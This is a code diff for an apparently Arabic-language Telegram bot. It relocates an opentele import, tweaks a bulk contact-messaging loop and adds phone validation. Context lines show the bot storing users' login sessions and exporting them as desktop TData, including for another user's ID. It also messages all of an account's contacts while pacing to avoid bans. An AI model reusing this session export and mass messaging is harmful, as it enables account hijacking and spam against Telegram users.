@@ -12,7 +12,8 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Mess
 from telethon import TelegramClient, events, functions, types
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
-from opentele.td import TDesktop
+
+# ⚠️ تم حذف استيراد opentele من هنا لحماية البوت ⚠️
 
 # --- الإعدادات المباشرة ---
 API_ID = 35980161
@@ -243,6 +244,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session_str = db[str(target_uid)][phone]["session"]
         await query.edit_message_text("⏳ جاري استخراج TData...")
         try:
+            # استيراد المكتبة هنا فقط لحماية البوت
+            from opentele.td import TDesktop
             temp_dir = f"tdata_{target_uid}_{phone}"
             os.makedirs(temp_dir, exist_ok=True)
             client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
@@ -296,6 +299,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         session_str = db[str(user_id)][phone]["session"]
         await query.edit_message_text("⏳ جاري استخراج TData...")
         try:
+            # استيراد المكتبة هنا فقط لحماية البوت
+            from opentele.td import TDesktop
             temp_dir = f"tdata_{user_id}_{phone}"
             os.makedirs(temp_dir, exist_ok=True)
             client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
@@ -369,7 +374,7 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 await client.send_message(c.id, text)
                 success += 1
-                await asyncio.sleep(1) # تجنب الحظر
+                await asyncio.sleep(1)
             except: pass
         await update.message.reply_text(f"✅ تم الإرسال لـ {success} جهة اتصال.")
         user_states.pop(user_id, None)
@@ -389,7 +394,14 @@ async def message_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if state == "waiting_phone":
         phone = text.strip()
         phone = ''.join(filter(str.isdigit, phone))
-        if not phone.startswith('+'): phone = '+' + phone
+        
+        if len(phone) < 7:
+            await update.message.reply_text("❌ رقم الهاتف غير صالح. أرسل الرقم مع رمز الدولة (مثال: +213xxxxxxxxx).")
+            user_states.pop(user_id, None)
+            return
+            
+        if not phone.startswith('+'): 
+            phone = '+' + phone
             
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
